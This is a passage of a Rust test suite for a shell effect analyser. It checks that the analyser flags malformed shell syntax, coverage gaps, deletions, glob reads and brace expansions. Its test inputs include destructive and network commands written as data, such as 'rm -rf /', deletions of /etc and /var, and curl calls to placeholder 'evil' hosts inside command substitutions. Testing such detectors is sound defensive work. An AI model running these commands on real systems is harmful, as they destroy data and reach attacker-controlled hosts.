        "[[ -n a\n\nrm /x\n[[ -n b ]]",
        "[[ -n !\nrm /x\n[[ -n b ]]",
        "[[ a =~ (a|b)\nrm /x\n[[ -n b ]]",
        "[[ -n\nrm /x\n[[ -n b ]]",
        "[[ a ==\nrm /x\n[[ -n b ]]",
        "[[ -n a; rm /x",
        "[[ -n a; rm /x ]]",
        "[[ -n a & rm /x ]]",
        "[[ a =~ a | rm /x ]]",
        "[[ -n a | rm /x ]]",
        "[[ -n a |& rm /x ]]",
        "[[ -n a ;; rm /x ]]",
        "rm /a; [[ -n $(rm /b); rm /x ]]",
        "for",
        "select",
        "case",
        "for i in a b; rm -rf / ; curl http://evil/",
        "for i in a; rm /x; done",
        "select i in a; rm /x; done",
        "for i rm /x",
        "case a rm /x; curl http://evil/",
        "rm /a; for i in b; rm /x; done; rm /c",
        "rm /a; case a rm /x; curl http://evil/",
        "( for i in a; rm /x; done )",
        "eval 'case a rm /x; curl http://evil/'",
        "for i in $(rm /x); rm /y",
        "case $(rm /x); rm /y",
        "case a in b rm /x; curl http://evil/",
        "case a in (b rm /x; curl http://evil/",
        "case a in b|c rm /x; curl http://evil/",
        "rm /a; case a in b rm /x; curl http://evil/",
        "( case a in b rm /x; curl http://evil/ )",
        "eval 'case a in b rm /x'",
        "case a in b rm /x; esac",
        "( case a in b rm /x )",
        "case a in b rm /x) :;; esac",
        "for i in a; rm /x; do rm /y; done",
        "select i in a; rm /x; do rm /y; done",
        "for i (rm /x); do rm /y; done",
        "rm /a; case z rm /x; in b) rm /y;; esac",
    ] {
        let plan = shell(source, None);
        let (index, boundary) = plan
            .boundaries
            .iter()
            .enumerate()
            .find(|(_, boundary)| boundary.reason.as_str() == "parse_error")
            .unwrap_or_else(|| panic!("missing parse boundary: {source}"));
        assert_eq!(boundary.class, BoundaryClass::ParseFailure);
        assert!(provenance_reaches(&plan, &boundary.provenance, |kind| {
            matches!(kind, ProvenanceKind::SourceSpan { start, end } if end > start)
        }));
        for domain in &required {
            assert!(!plan.coverage.is_full(domain), "{source}: {domain:?}");
            assert!(
                plan.coverage
                    .gaps(domain)
                    .contains(&effinterp_proto::BoundaryRef(index as u32)),
                "{source}: {domain:?}"
            );
        }
        if source.starts_with("rm /a;") {
            assert!(has_delete(&plan, "/a"));
        }
        if source.contains("$(rm /b)") {
            assert!(has_delete(&plan, "/b"));
        }
        if source.contains("rm /y")
            && (source.contains("do rm /y")
                || source.contains("in b)")
                || source.ends_with("&& rm /y"))
        {
            assert!(has_delete(&plan, "/y"), "{source}");
        }
    }
    for source in [
        "f() { echo {; rm /x; }; f",
        "f() { echo \"((\"; rm /x; }; f",
        "f() { g() { :; }; rm /x; }; f",
        "f() { { { { rm /x; }; }; }; }; f",
        "case a in a) echo esac; rm /x;; esac",
        "[[ -n a ]] ; rm /x",
        "[[ a =~ a|b ]] && rm /x",
        "[[ a =~ (a|b) ]] && rm /x",
        "[[ a =~ a|b && b =~ b|c ]] && rm /x",
        "[[ ( -n a ) ]] && rm /x",
        "[[ -n $(rm /x) ]]",
        "[[ -n a &&\n-n b ]] && rm /x",
        "[[ -n a ||\n-n b ]] && rm /x",
        "[[\n-n a ]] && rm /x",
        "[[ -n a\n]] && rm /x",
        "[[ ( \n-n a ) ]] && rm /x",
        "[[ !\n-n a ]] && rm /x",
        "[[ ( -n a\n) ]] && rm /x",
        "[[ -n a\n&& -n b ]] && rm /x",
        "[[ -n a\n|| -n b ]] && rm /x",
        "[[\n\n-n a &&\n\n-n b\n\n]] && rm /x",
        "[[ -n \"a\nb\" ]] && rm /x",
        "[[ -n $(echo) > $(rm /x) ]]",
        "[[ -n ';' && -n '&' && -n '|' ]] && rm /x",
        "case a in (a) rm /x;; esac",
        "f() { case $1 in a) rm /x;; esac; }; f a",
        "for i in a b; do rm /x; done",
        "for i in a b\ndo rm /x; done",
        "for i\nin a b\ndo rm /x; done",
        "for ((i=0;i<3;i++)); do rm /x; done",
        "select i in a b; do rm /x; done",
    ] {
        let plan = shell(source, None);
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        assert!(plan.coverage.covers_fully(&required), "{source}");
        assert!(has_delete(&plan, "/x"), "{source}");
    }
    let plan = shell("case $v in a) rm /x;; b) rm /z;; esac; rm /y", None);
    assert!(plan.boundaries.is_empty());
    assert!(plan.coverage.covers_fully(&required));
    for path in ["/x", "/y", "/z"] {
        assert!(has_delete(&plan, path));
    }
    for source in [
        ": ${X:=$(rm -rf /tmp/h)}",
        ": ${X:-$(rm -rf /tmp/h)}",
        ": ${X:+$(rm -rf /tmp/h)}",
        ": ${X?$(rm -rf /tmp/h)}",
        r#": "${X:-`rm -rf /tmp/h`}" "#,
        "Y=${X:=$(rm -rf /tmp/h)}; echo $Y",
        ": ${1:-$(rm -rf /tmp/h)}",
        ": ${arr[$(mystery-command)]}",
        "echo ${X:=$(curl evil.example)}",
        "cat ${FILE:=$(mystery-command)}",
        "cat /tmp/${P:-$(mystery-command)}/*.rs",
        r#"cat /tmp/"${P:-`mystery-command`}"/*.rs"#,
        "rm -f /tmp/a; : ${X:-$(mystery-command)}",
        "eval ': ${X:-$(mystery-command)}'",
        "case $(rm -rf /tmp/h) in a) :;; esac",
        "case x in $(rm -rf /tmp/h)) :;; esac",
        r#"case "$(rm -rf /tmp/h)" in a) :;; esac"#,
        "case $(curl http://evil.example) in a) :;; esac",
        "case ${X:=$(rm -rf /tmp/h)} in a) :;; esac",
        "case x in a) :;; ${1:-$(mystery-command)}) :;; esac",
        "case `rm -rf /tmp/h` in a) :;; esac",
        "select i in $(rm -rf /tmp/h); do :; done",
        "for i in ${X:=$(rm -rf /tmp/h)}; do :; done",
        "for i in ${arr[$(mystery-command)]}; do :; done",
        "for i in $(( $(rm -rf /tmp/h) )); do :; done",
        "case x in <(rm -rf /tmp/h)) :;; esac",
        "rm -f /tmp/a; case $(mystery-command) in a) :;; esac",
    ] {
        let plan = shell(source, Some("/w"));
        for domain in effinterp_proto::DOMAINS {
            let domain = Domain::new(domain);
            assert!(!plan.coverage.is_full(&domain), "{source}: {domain:?}");
            assert!(
                !plan.coverage.gaps(&domain).is_empty(),
                "{source}: {domain:?}"
            );
        }
        assert_ne!(
            plan.causality.coverage.level,
            CoverageLevel::Full,
            "{source}"
        );
        assert!(!plan.causality.coverage.gaps.is_empty(), "{source}");
        assert!(plan.boundaries.iter().any(|boundary| {
            boundary.class == BoundaryClass::Unsupported && !boundary.provenance.is_empty()
        }));
    }
    // A `for` list's command substitutions are walked, not left opaque.
    for source in [
        "for i in $(rm -rf /tmp/h); do :; done",
        r#"for i in "$(rm -rf /tmp/h)"; do :; done"#,
        "for i in a $(rm -rf /tmp/h) b; do echo $i; done",
        "eval 'for i in `rm -rf /tmp/h`; do :; done'",
    ] {
        let plan = shell(source, Some("/w"));
        assert!(has_delete(&plan, "/tmp/h"), "{source}");
        assert!(
            plan.boundaries
                .iter()
                .all(|boundary| boundary.class != BoundaryClass::Unsupported),
            "{source}"
        );
    }
    for (limit, value) in [
        ("max_shell_words", 1),
        ("max_boundaries", 0),
        ("max_analysis_bytes", 100),
    ] {
        for source in [
            ": a b ${X:-$(mystery-command)}",
            "case $(mystery-command) in a) :;; esac",
            "case x in a) :;; $(mystery-command)) :;; esac",
            "for i in a b $(mystery-command); do :; done",
            "select i in a b $(mystery-command); do :; done",
            "f() { rm /x\n((; }; f",
            "f() { rm /x\ncase y in a); }; f",
            "f() { rm /x\ncat <<EOF\n}; f",
            "[[ -n a\nrm /x",
            "[[ -n a\nrm /x\n[[ -n b ]]",
            "rm /a; [[ -n b; rm /x ]]",
            "rm /x ;; rm /y",
            "case a in b rm /x; curl http://evil/",
            "for i in a; rm /x; do rm /y; done",
            "case z rm /x; in b) rm /y;; esac",
            "rm /a; for i in a b; rm /x; done",
            "rm /a; case a rm /x; curl http://evil/",
        ] {
            let mut limits = default_limits();
            limits.insert(limit.into(), value);
            let plan = Engine::with_limits(limits)
                .unwrap()
                .with_causality_detail(true)
                .analyze(&Subject::Shell {
                    source: source.into(),
                    cwd: None,
                    context: Default::default(),
                })
                .unwrap();
            validate_plan(&plan).unwrap();
            assert!(!plan.coverage.covers_fully(&required), "{limit}");
            assert!(!plan.boundaries.is_empty(), "{limit}");
        }
    }
    for source in [
        "col --unknown",
        "eval ':'; col --unknown",
        "col --unknown; eval ':'",
        "sh -c ':'; col --unknown",
        "col --unknown; sh -c ':'",
        "sh -c 'col --unknown'",
    ] {
        let plan = shell(source, Some("/workspace/project"));
        assert_eq!(
            plan.coverage.level(&Domain::new("filesystem")),
            None,
            "{source}"
        );
        assert!(!plan.coverage.gaps(&Domain::new("process")).is_empty());
        assert!(plan.boundaries.iter().any(|boundary| {
            boundary.reason.as_str() == "unrecognized_arguments"
                && boundary.domains.contains(&Domain::new("process"))
        }));
    }
}

#[test]
fn symbolic_filesystem_fragments_agree_with_bound_words() {
    use effinterp_proto::{PathPlatform, normalize_resource};
    fn bind(resource: &ResourceExpr, env: &[(&str, &str)]) -> ResourceExpr {
        match resource {
            ResourceExpr::Environment { name } => ResourceExpr::Literal {
                value: env.iter().find(|(key, _)| *key == name).unwrap().1.into(),
            },
            ResourceExpr::Join { parts } => ResourceExpr::Join {
                parts: parts.iter().map(|part| bind(part, env)).collect(),
            },
            resource => resource.clone(),
        }
    }
    for (word, env, expected) in [
        ("$HOME/../x", vec![("HOME", "/home/test")], "/home/x"),
        ("${HOME}x", vec![("HOME", "/home/test")], "/home/testx"),
        ("$HOME/x", vec![("HOME", "/home/test")], "/home/test/x"),
        ("$OUT.tgz", vec![("OUT", "/tmp/out")], "/tmp/out.tgz"),
        ("foo${NAME}", vec![("NAME", "bar")], "/work/foobar"),
        ("foo${NAME}", vec![("NAME", "")], "/work/foo"),
        ("${A}${B}", vec![("A", "/tmp/"), ("B", "x")], "/tmp/x"),
        (
            "$HOME/.cache/../x",
            vec![("HOME", "/home/test")],
            "/home/test/x",
        ),
        ("foo/../${NAME}", vec![("NAME", "bar")], "/work/bar"),
    ] {
        let source = format!("cat \"{word}\"");
        let unbound = shell(&source, Some("/work"));
        let bound = Engine::new()
            .with_causality_detail(true)
            .analyze(&Subject::Shell {
                source,
                cwd: Some("/work".into()),
                context: HostContext {
                    env: env
                        .iter()
                        .map(|(k, v)| (k.to_string(), v.to_string()))
                        .collect(),
                    ..HostContext::default()
                },
            })
            .unwrap();
        validate_plan(&bound).unwrap();
        let read = |plan: &Plan| {
            plan.effects
                .iter()
                .find(|effect| effect.operation.0 == "filesystem.read")
                .unwrap()
                .resource
                .clone()
        };
        let symbolic = bind(&read(&unbound), &env);
        let parts = match &symbolic {
            ResourceExpr::Join { parts } => parts.clone(),
            other => vec![other.clone()],
        };
        let folded = effinterp_proto::fold_fs_join(&parts, PathPlatform::Posix).unwrap();
        assert_eq!(folded, expected, "{word}: {symbolic:?}");
        assert_eq!(
            normalize_resource(read(&bound), PathPlatform::Posix),
            ResourceExpr::Concrete {
                identity: ResourceIdentity::FsPath {
                    path: expected.into()
                }
            },
            "{word}"
        );
    }
}

#[test]
fn filesystem_globs_retain_roots_and_invalid_patterns_have_boundaries() {
    for source in [
        r#"set -- '/tmp/[ab]/*.rs'; cat "$@""#,
        r#"set -- '/tmp/[ab]/*.rs'; cat "$*""#,
        r#"arr=('/tmp/[ab]/*.rs'); cat "${arr[@]}""#,
        r#"arr=('/tmp/[ab]/*.rs'); cat "${arr[*]}""#,
    ] {
        let plan = shell(source, Some("/work"));
        assert_eq!(exec_argv(&plan, "cat"), ["cat", "/tmp/[ab]/*.rs"]);
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.read"
                && matches!(&effect.resource, ResourceExpr::Concrete {
                    identity: ResourceIdentity::FsPath { path }
                } if path == "/tmp/[ab]/*.rs")
        }));
        assert!(plan.boundaries.is_empty(), "{source}");
    }

    for (source, target, excluded) in [
        (
            r#"P='/tmp/[ab]'; cat $P/{x,y}/*.rs"#,
            "/tmp/a/x/a.rs",
            "/tmp/[ab]/x/a.rs",
        ),
        (
            r#"P='/tmp/[ab]'; cat "$P"/{x,y}/*.rs"#,
            "/tmp/[ab]/x/a.rs",
            "/tmp/a/x/a.rs",
        ),
        (
            r#"P=''; cat ${P:=/tmp/[ab]}/*.rs"#,
            "/tmp/a/x.rs",
            "/tmp/[ab]/x.rs",
        ),
        (
            r#"P=''; cat "${P:=/tmp/[ab]}"/*.rs"#,
            "/tmp/[ab]/x.rs",
            "/tmp/a/x.rs",
        ),
        ("cat ../*.rs", "/a.rs", "/work/a.rs"),
        ("cat /w/../y/*.rs", "/y/a.rs", "/w/y/a.rs"),
        (
            "cd /w/x; cat ../build/*.rs",
            "/w/build/a.rs",
            "/w/x/build/a.rs",
        ),
        ("cat ./x/*.rs", "/work/x/a.rs", "/work/x/a.txt"),
        ("ls ./*.rs", "/work/a.rs", "/work/a.txt"),
        ("cat x/./y/*.rs", "/work/x/y/a.rs", "/work/x/a.rs"),
        ("cat x//y/*.rs", "/work/x/y/a.rs", "/work/x/a.rs"),
        ("cd sub && cat ./x/*.rs", "/work/sub/x/a.rs", "/work/x/a.rs"),
        ("cp ./a/*.rs ./b/", "/work/a/x.rs", "/work/a/x.txt"),
        (
            r#"set -- '/tmp/[ab]'; cat $@/*.rs"#,
            r#"/tmp/a/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]'; cat "$@"/*.rs"#,
            r#"/tmp/[ab]/x.rs"#,
            r#"/tmp/a/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]/*.rs'; cat $@"#,
            r#"/tmp/b/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"set -- '/tmp/a*'; cat $@/*.rs"#,
            r#"/tmp/abc/x.rs"#,
            r#"/tmp/b/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]'; cat $*/*.rs"#,
            r#"/tmp/a/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]'; cat "$*"/*.rs"#,
            r#"/tmp/[ab]/x.rs"#,
            r#"/tmp/a/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]/*.rs'; cat $*"#,
            r#"/tmp/b/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"set -- '/tmp/a*'; cat $*/*.rs"#,
            r#"/tmp/abc/x.rs"#,
            r#"/tmp/b/x.rs"#,
        ),
        (
            r#"arr=('/tmp/[ab]'); cat ${arr[@]}/*.rs"#,
            r#"/tmp/a/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"arr=('/tmp/[ab]'); cat "${arr[@]}"/*.rs"#,
            r#"/tmp/[ab]/x.rs"#,
            r#"/tmp/a/x.rs"#,
        ),
        (
            r#"arr=('/tmp/[ab]/*.rs'); cat ${arr[@]}"#,
            r#"/tmp/b/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"arr=('/tmp/a*'); cat ${arr[@]}/*.rs"#,
            r#"/tmp/abc/x.rs"#,
            r#"/tmp/b/x.rs"#,
        ),
        (
            r#"arr=('/tmp/[ab]'); cat ${arr[*]}/*.rs"#,
            r#"/tmp/a/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"arr=('/tmp/[ab]'); cat "${arr[*]}"/*.rs"#,
            r#"/tmp/[ab]/x.rs"#,
            r#"/tmp/a/x.rs"#,
        ),
        (
            r#"arr=('/tmp/[ab]/*.rs'); cat ${arr[*]}"#,
            r#"/tmp/b/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"arr=('/tmp/a*'); cat ${arr[*]}/*.rs"#,
            r#"/tmp/abc/x.rs"#,
            r#"/tmp/b/x.rs"#,
        ),
        (
            r#"f() { cat $@/*.rs; }; f '/tmp/[ab]'"#,
            r#"/tmp/b/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"f() { cat "$@"/*.rs; }; f '/tmp/[ab]'"#,
            r#"/tmp/[ab]/x.rs"#,
            r#"/tmp/a/x.rs"#,
        ),
        (
            r#"set -- '/tmp/a\b'; cat $@/*.rs"#,
            r#"/tmp/ab/x.rs"#,
            r#"/tmp/a\b/x.rs"#,
        ),
        (
            r#"arr=('/tmp/a\b'); cat ${arr[@]}/*.rs"#,
            r#"/tmp/ab/x.rs"#,
            r#"/tmp/a\b/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]'; cat $1/*.rs"#,
            r#"/tmp/a/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"f() { cat $1/*.rs; }; f '/tmp/[ab]'"#,
            r#"/tmp/b/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"set -- '/tmp/a*'; cat ${1}/*.rs"#,
            r#"/tmp/abc/x.rs"#,
            r#"/tmp/b/x.rs"#,
        ),
        (
            r#"f() { cat ${1}/*.rs; }; f '/tmp/a*'"#,
            r#"/tmp/abc/x.rs"#,
            r#"/tmp/b/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]'; cat "$1"/*.rs"#,
            r#"/tmp/[ab]/x.rs"#,
            r#"/tmp/a/x.rs"#,
        ),
        (
            r#"f() { cat "${1}"/*.rs; }; f '/tmp/[ab]'"#,
            r#"/tmp/[ab]/x.rs"#,
            r#"/tmp/a/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]/*.rs'; cat $1"#,
            r#"/tmp/a/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"set -- '/tmp/[ab]/*.rs /tmp/c/*.rs'; cat $1"#,
            r#"/tmp/a/x.rs"#,
            r#"/tmp/[ab]/x.rs"#,
        ),
        (
            r#"set -- '/tmp/a\b'; cat $1/*.rs"#,
            r#"/tmp/ab/x.rs"#,
            r#"/tmp/a\b/x.rs"#,
        ),
        (
            r#"set -- '/tmp/a\b'; cat "$1"/*.rs"#,
            r#"/tmp/a\b/x.rs"#,
            r#"/tmp/ab/x.rs"#,
        ),
        (r"cat /tmp/\[ab\]/*.rs", "/tmp/[ab]/x.rs", "/tmp/a/x.rs"),
        (r#"cat /tmp/"[ab]"/*.rs"#, "/tmp/[ab]/x.rs", "/tmp/a/x.rs"),
        (r"cat /tmp/'[ab]'/*.rs", "/tmp/[ab]/x.rs", "/tmp/b/x.rs"),
        (r"cat /tmp/a\\b/*.rs", r"/tmp/a\b/x.rs", "/tmp/ab/x.rs"),
        (r"cat /tmp/\*\?/*.rs", "/tmp/*?/x.rs", "/tmp/ab/x.rs"),
        (r"cat /tmp/*\?.rs", "/tmp/file?.rs", "/tmp/filea.rs"),
        (r"cat /tmp/[ab]/*.rs", "/tmp/a/x.rs", "/tmp/[ab]/x.rs"),
        (
            r"P='/tmp/a\b'; cat $P/*.rs",
            "/tmp/ab/x.rs",
            r"/tmp/a\b/x.rs",
        ),
        (
            r#"P='/tmp/a\b'; cat "$P"/*.rs"#,
            r"/tmp/a\b/x.rs",
            "/tmp/ab/x.rs",
        ),
        (
            r#"P='/tmp/[ab]'; cat $P/*.rs"#,
            "/tmp/a/x.rs",
            "/tmp/[ab]/x.rs",
        ),
        (
            r#"P='/tmp/a*'; cat $P/*.rs"#,
            "/tmp/abc/x.rs",
            "/tmp/b/x.rs",
        ),
        (
            r#"P='[ab]'; cat /tmp/${P}/*.rs"#,
            "/tmp/b/x.rs",
            "/tmp/[ab]/x.rs",
        ),
        (
            r#"P='/tmp/[ab]'; cat "$P"/*.rs"#,
            "/tmp/[ab]/x.rs",
            "/tmp/a/x.rs",
        ),
        (
            r#"P='a*'; cat /tmp/"${P}"/*.rs"#,
            "/tmp/a*/x.rs",
            "/tmp/abc/x.rs",
        ),
        (
            r#"P='/tmp/[ab]/*.rs'; cat $P"#,
            "/tmp/a/x.rs",
            "/tmp/[ab]/x.rs",
        ),
        (
            r#"P='/tmp/[ab]'; Q=$P; cat $Q/*.rs"#,
            "/tmp/a/x.rs",
            "/tmp/[ab]/x.rs",
        ),
        (
            r#"P='/tmp/[ab]'; Q=$P; cat "$Q"/*.rs"#,
            "/tmp/[ab]/x.rs",
            "/tmp/a/x.rs",
        ),
        (
            r#"P='/tmp/[ab]/*.rs /tmp/c/*.rs'; cat $P"#,
            "/tmp/a/x.rs",
            "/tmp/[ab]/x.rs",
        ),
        (
            r#"P='/tmp/[ab]'; cat ${P:-/tmp/c}/*.rs"#,
            "/tmp/a/x.rs",
            "/tmp/[ab]/x.rs",
        ),
    ] {
        let plan = shell(source, Some("/work"));
        let read = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.read")
            .unwrap();
        let ResourceExpr::Pattern {
            pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. },
        } = &read.resource
        else {
            panic!("expected filesystem pattern for {source}: {read:?}");
        };
        assert_eq!(
            effinterp_proto::glob_match(pattern, target),
            Ok(true),
            "{source}: {pattern}"
        );
        assert_eq!(
            effinterp_proto::glob_match(pattern, excluded),
            Ok(false),
            "{source}: {pattern}"
        );
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
    }

    for (operand, cwd, target) in [
        ("./build/*", "/work", "/work/build/o.o"),
        ("../build/*", "/w/x", "/w/build/o.o"),
    ] {
        let plan = shell(&format!("rm -rf {operand}"), Some(cwd));
        assert!(plan.boundaries.is_empty());
        assert_eq!(exec_argv(&plan, "rm"), ["rm", "-rf", operand]);
        assert!(plan.effects.iter().any(|effect| {
            effect.operation.0 == "filesystem.delete"
                && matches!(&effect.resource, ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } }
                if effinterp_proto::glob_match(pattern, target) == Ok(true))
        }));
    }

    for root in ["/tmp/[ab]", r"/tmp/a\b", "/tmp/a*b?", "/tmp/plain"] {
        for (source, operation, tail) in [
            ("cat *.rs", "filesystem.read", "x.rs"),
            ("tar xf a.tar", "filesystem.write", ".hidden/x"),
            ("unzip a.zip", "filesystem.write", ".hidden/x"),
        ] {
            let plan = shell(source, Some(root));
            let target = format!("{root}/{tail}");
            assert!(
                plan.effects.iter().any(|effect| {
                    effect.operation.0 == operation
                        && matches!(&effect.resource, ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } }
                        if effinterp_proto::glob_match(pattern, &target) == Ok(true))
                }),
                "{source} at {root}: {:?}",
                plan.effects
            );
        }
    }

    for source in ["tar -xf a.tar -C \"$OUT\"", "unzip a.zip -d \"$OUT\""] {
        let plan = shell(source, None);
        let write = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.write")
            .unwrap();
        let ResourceExpr::Join { parts } = &write.resource else {
            panic!("symbolic extraction root")
        };
        assert!(matches!(&parts[0], ResourceExpr::Environment { name } if name == "OUT"));
        let ResourceExpr::Pattern {
            pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. },
        } = parts.last().unwrap()
        else {
            panic!("recursive extraction tail")
        };
        for target in ["a/b", ".hidden/a"] {
            assert_eq!(effinterp_proto::glob_match(pattern, target), Ok(true));
        }
    }
    for source in [
        "cat *.rs",
        "cat pre*${NAME}",
        "cat ../*.rs",
        "cat a/../../build/*",
    ] {
        let plan = shell(source, None);
        validate_plan(&plan).unwrap();
        assert!(
            plan.boundaries.is_empty(),
            "{source}: {:?}",
            plan.boundaries
        );
        let read = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.read")
            .unwrap();
        assert!(
            matches!(&read.resource, ResourceExpr::Join { parts } if matches!(&parts[0], ResourceExpr::Parameter { name } if name == "cwd"))
        );
    }
    let plan = shell("cat /tmp/*", None);
    assert!(plan.effects.iter().any(|effect| matches!(&effect.resource, ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::FsPath { glob: pattern, .. } } if pattern == "/tmp/*")));
    for source in [
        "set -- '/tmp/[ab]' '/tmp/c'; cat $@/*.rs",
        "arr=('/tmp/[ab]' '/tmp/c'); cat ${arr[@]}/*.rs",
        "set -- '/tmp/[ab] /tmp/c'; cat $@/*.rs",
        "arr=('/tmp/[ab] /tmp/c'); cat ${arr[@]}/*.rs",
        "set -- '/tmp/[ab]/*.rs /tmp/c/*.rs'; cat $@",
        "arr=('/tmp/[ab]/*.rs /tmp/c/*.rs'); cat ${arr[@]}",
        "IFS=:; set -- '/tmp/[ab]:/tmp/c'; cat $@/*.rs",
        "shopt -s dotglob; cat /tmp/*",
        "set -f; cat /tmp/*",
        "setopt GLOB_DOTS; cat /tmp/*",
        "P='/tmp/[ab] /tmp/c'; cat $P/*.rs",
        "set -- '/tmp/[ab] /tmp/c'; cat $1/*.rs",
        "f() { cat $1/*.rs; }; f '/tmp/[ab] /tmp/c'",
        "P='/tmp/[ab] /tmp/c'; cat ${P:-/tmp/d}/*.rs",
    ] {
        assert!(!shell(source, None).boundaries.is_empty(), "{source}");
    }
    // A complete listing of the searched directory certifies the one
    // case-insensitive match; without one, or with several matches, bash's
    // choice stays unknown.
    struct Listing(Option<Vec<&'static str>>);
    impl SourceResolver for Listing {
        fn resolve(&self, _: SourceRequest<'_>) -> SourceResponse {
            SourceResponse::Refused(SourceRefusal::Unavailable(UnavailableReason::Missing))
        }
        fn siblings(&self, path: &str) -> Option<Vec<String>> {
            assert!(path.starts_with("/w/certs/"), "{path}");
            self.0.as_ref().map(|entries| {
                entries
                    .iter()
                    .map(|entry| format!("/w/certs/{entry}"))
                    .collect()
            })
        }
    }
    for (listing, resolved) in [
        (None, None),
        (
            Some(vec!["ca.pem", "server.key"]),
            Some("/w/certs/server.key"),
        ),
        (Some(vec!["server.crt", "server.key"]), None),
        (Some(vec!["ca.pem"]), None),
    ] {
        for source in [
            "shopt -s nocaseglob; cat certs/SERVER.*",
            "bash -O nocaseglob -c 'cat certs/SERVER.*'",
        ] {
            let plan = Engine::new()
                .with_resolver(Box::new(Listing(listing.clone())))
                .analyze(&Subject::Shell {
                    source: source.into(),
                    cwd: Some("/w".into()),
                    context: Default::default(),
                })
                .unwrap();
            validate_plan(&plan).unwrap();
            let boundary = plan.boundaries.iter().any(|boundary| {
                boundary.reason.as_str() == "unsupported_shell_syntax"
                    && boundary.detail.as_deref()
                        == Some(
                            "case-insensitive pathname expansion cannot be resolved against observed directory listings",
                        )
            });
            let read = plan.effects.iter().any(|effect| {
                effect.operation.0 == "filesystem.read"
                    && matches!(&effect.resource, ResourceExpr::Concrete {
                        identity: ResourceIdentity::FsPath { path }
                    } if Some(path.as_str()) == resolved)
            });
            assert_eq!(
                boundary,
                resolved.is_none(),
                "{source} {listing:?}: {:?}",
                plan.boundaries
            );
            assert_eq!(
                read,
                resolved.is_some(),
                "{source} {listing:?}: {:?}",
                plan.effects
            );
        }
    }
    // A parent after a wildcard reads as the wildcard's directory, beside a
    // boundary for a match that is a symlink.
    let plan = shell("cat /tmp/*/../x", None);
    assert!(plan.boundaries.iter().any(|boundary| {
        boundary.reason == effinterp_proto::BoundaryReason::OBSERVATION_UNAVAILABLE
            && boundary
                .domains
                .iter()
                .any(|domain| domain.0 == "filesystem")
    }));
    assert!(plan.effects.iter().any(|effect| {
        effect.operation.0 == "filesystem.read"
            && matches!(&effect.resource, ResourceExpr::Pattern {
                pattern: effinterp_proto::ResourcePattern::FsPath { glob, .. }
            } if glob == "/tmp/x")
    }));
}

#[test]
fn brace_expansions_produce_argv_words() {
    for (source, paths) in [
        ("rm -rf /{etc,var}", vec!["/etc", "/var"]),
        ("rm -rf {/etc,/var}/x", vec!["/etc/x", "/var/x"]),
        ("rm -rf /{,}", vec!["/", "/"]),
        ("X=etc; rm -rf /{$X,var}", vec!["/etc", "/var"]),
        ("rm -rf /{a,{b,c}}", vec!["/a", "/b", "/c"]),
        ("rm -rf /{{etc,var}..bak}", vec!["/etc..bak", "/var..bak"]),
        (
            "rm -rf /backup/{{1..3}..old}",
            vec!["/backup/{{1..3}..old}"],
        ),
        ("rm -rf /{{1,2}..3}", vec!["/1..3", "/2..3"]),
        (
            "rm -rf /{{a,b}..{c,d}}",
            vec!["/a..c", "/a..d", "/b..c", "/b..d"],
        ),
        ("rm -rf /{{1..2}..3}", vec!["/{{1..2}..3}"]),
        ("rm -rf /{{a,b}..3}", vec!["/a..3", "/b..3"]),
        ("rm -rf /{x{1,2}y..z}", vec!["/x1y..z", "/x2y..z"]),
        ("rm -rf /x{1..3}y", vec!["/x1y", "/x2y", "/x3y"]),
        ("rm -rf /{5..1}", vec!["/5", "/4", "/3", "/2", "/1"]),
        ("rm -rf /{01..03}", vec!["/01", "/02", "/03"]),
        ("rm -rf /{+01..-1}", vec!["/1", "/0", "/-1"]),
        ("rm -rf /{+01..1}", vec!["/1"]),
        ("rm -rf /{1..+01}", vec!["/1"]),
        ("rm -rf /{-01..+1}", vec!["/-01", "/000", "/001"]),
        ("rm -rf /{+001..01}", vec!["/0001"]),
        ("rm -rf /{a..e..2}", vec!["/a", "/c", "/e"]),
        ("rm -rf /{a,b}{c,d}", vec!["/ac", "/ad", "/bc", "/bd"]),
        ("rm -rf \"/tmp/{a,b}\"", vec!["/tmp/{a,b}"]),
        (r"rm -rf /tmp/\{a,b\}", vec!["/tmp/{a,b}"]),
        ("rm -rf /tmp/{a}", vec!["/tmp/{a}"]),
        ("rm -rf /tmp/{a,b", vec!["/tmp/{a,b"]),
        ("rm -rf /tmp/{1.5..3}", vec!["/tmp/{1.5..3}"]),
        ("X={a,b}; rm -rf /tmp/$X", vec!["/tmp/{a,b}"]),
        ("declare TOOL={echo,rm}; \"$TOOL\" -rf /", vec!["/"]),
